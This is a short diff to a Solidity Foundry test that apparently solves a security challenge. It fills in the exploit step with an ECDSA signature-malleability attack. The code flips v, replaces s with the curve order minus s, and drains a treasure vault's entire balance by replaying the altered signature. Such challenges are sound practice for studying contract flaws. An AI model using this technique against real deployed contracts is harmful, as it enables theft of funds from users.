@@ -54,7 +54,11 @@ contract Testing is Test {
     function testChallengeExploit() public {
         vm.startPrank(attacker, attacker);
 
-        // implement solution here
+        // change v and s values like this comment says: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol#L133-L136
+        uint8 _v = v == 27 ? 28 : 27;
+        bytes32 _s = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - uint256(s));
+
+        treasureVault.sendFundsWithAuth({amount: address(treasureVault).balance, nonce: 0, v: _v, r: r, s: _s});
 
         vm.stopPrank();
         validation();
